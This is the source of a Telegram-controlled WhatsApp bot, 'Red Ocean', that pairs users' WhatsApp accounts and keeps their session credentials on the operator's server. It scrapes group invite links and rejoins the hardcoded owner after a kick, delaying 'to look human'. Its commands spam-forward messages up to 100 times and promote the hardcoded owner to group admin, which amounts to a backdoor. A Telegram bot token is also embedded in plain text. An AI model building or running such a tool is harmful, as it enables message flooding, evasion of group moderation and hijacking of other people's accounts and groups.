const { Telegraf } = require('telegraf');
const { default: makeWASocket, useMultiFileAuthState, delay, fetchLatestWaWebVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs-extra');

// --- ⚙️ CONFIG ---
const TG_TOKEN = '8473172506:AAFoZL49LB5Z5y5diupLn05Awum625lmP5s';
const OWNER = '2347074473640R@s.whatsapp.net'; 
const bot = new Telegraf(TG_TOKEN);

// Database for Group Invite Links
const linkDB = './links.json';
if (!fs.existsSync(linkDB)) fs.writeJsonSync(linkDB, {});

async function startRedOcean(tgCtx, phoneNumber) {
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${tgCtx.from.id}`);
    const { version } = await fetchLatestWaWebVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        logger: pino({ level: 'silent' }),
        browser: ["Red Ocean Engine", "Safari", "1.0.0"]
    });

    if (!sock.authState.creds.registered) {
        let code = await sock.requestPairingCode(phoneNumber);
        tgCtx.reply(`🔱 RED OCEAN PAIRING: ${code}\n\nEnter this in WhatsApp > Linked Devices.`);
    }

    sock.ev.on('creds.update', saveCreds);

    // --- 🛡️ THE "CHOSEN ONE" PROTECTION & AUTO-REJOIN ---
    sock.ev.on('group-participants.update', async (update) => {
        const { id, participants, action } = update;
        const db = await fs.readJson(linkDB);

        // 1. Scrape Link if Bot is Admin
        const metadata = await sock.groupMetadata(id);
        const isAdmin = metadata.participants.find(p => p.id === sock.user.id && p.admin);
        if (isAdmin) {
            const code = await sock.groupInviteCode(id);
            db[id] = code;
            await fs.writeJson(linkDB, db);
        }

        // 2. Anti-Kick Logic
        if (action === 'remove' && participants.includes(OWNER)) {
            await sock.sendMessage(id, { text: "⚠️ *FORBIDDEN:* You cannot kick the Chosen One. Red Ocean is returning..." });
            
            const inviteCode = db[id];
            if (inviteCode) {
                await delay(5000); // 5 sec wait to look "human"
                await sock.groupAcceptInvite(inviteCode);
                await sock.sendMessage(id, { text: "🔱 *I AM BACK.* Who dared to kick the Chosen One?" });
            }
        }
    });

    // --- ⚔️ WAR COMMANDS ---
    sock.ev.on('messages.upsert', async (m) => {
        const msg = m.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        const from = msg.key.remoteJid;
        const body = msg.message.conversation || msg.message.extendedTextMessage?.text || "";
        
        if (!body.startsWith('.')) return;
        const args = body.slice(1).trim().split(/ +/);
        const cmd = args.shift().toLowerCase();

        // .spam [count] - Replies to anything
        if (cmd === 'spam') {
            const count = Math.min(parseInt(args[0]) || 10, 100); // Max 100 at a time
            const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
            if (!quoted) return sock.sendMessage(from, { text: "❌ Reply to the target message/sticker/photo first!" });

            for (let i = 0; i < count; i++) {
                await sock.sendMessage(from, { forward: m.messages[0].message.extendedTextMessage.contextInfo.quotedMessage });
                await delay(200); 
            }
        }

        // .hijack - Self promote
        if (cmd === 'hijack') {
            await sock.groupParticipantsUpdate(from, [OWNER], "promote");
            await sock.sendMessage(from, { text: "⚡ *HIJACK SUCCESS:* Ownership confirmed." });
        }
    });

    sock.ev.on('connection.update', (up) => {
        if (up.connection === 'open') tgCtx.reply("🔱 RED OCEAN IS LIVE.");
    });
}

bot.start((ctx) => ctx.reply("🔱 RED OCEAN BOT V2.5\nSend your phone number to pair."));
bot.on('text', async (ctx) => {
    if (ctx.message.text.match(/^\d+$/)) {
        ctx.reply("⏳ Deploying Red Ocean Engine...");
        await startRedOcean(ctx, ctx.message.text);
    }
});

bot.launch();
